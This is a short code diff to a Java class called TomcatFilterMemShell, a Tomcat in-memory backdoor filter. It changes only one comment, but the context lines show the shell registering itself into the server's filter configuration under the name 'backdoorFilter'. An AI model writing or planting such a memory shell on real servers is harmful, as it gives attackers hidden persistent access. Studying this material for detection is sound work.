@@ -39,7 +39,7 @@ public class TomcatFilterMemShell implements Filter {
             // 获取当前tomcat标准上下文中已经存在的filterConfigs
             Map filterConfigs = (Map) Configs.get(standardContext);
 
-            // 判断下防止重复注入
+            // skip if already present
             if (filterConfigs.get(name) == null) {
                 // 构造filterDef，并将filterDef添加到standardContext的FilterDef中
                 TomcatFilterMemShell backdoorFilter = new TomcatFilterMemShell();
